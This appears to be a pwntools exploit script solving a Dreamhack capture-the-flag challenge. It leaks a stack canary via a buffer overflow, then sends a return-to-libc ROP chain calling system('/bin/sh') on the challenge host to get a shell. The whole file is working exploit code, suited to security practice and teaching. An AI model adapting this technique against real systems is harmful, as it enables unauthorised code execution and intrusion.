from pwn import *

r = remote("host1.dreamhack.games", 12621)
e = ELF("/mnt/c/Users/Storm/ctf/679837da-278d-4830-b6fb-4f5f644119c7/rtl")

# leak canary
leak = b'A' * 0x39
r.sendafter("Buf: ", leak)
r.recvuntil(leak)
canary = u64(b'\x00' + r.recvn(7))
print(canary)

# ROP Gadget
ret = 0x400596
pop_rdi = 0x400853
binsh = 0x400874
system_plt = e.plt['system']

# exploit
payload = b'A' * 0x38
payload += p64(canary)
payload += b'B' * 0x8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)

r.sendafter("Buf: ", payload)

r.interactive()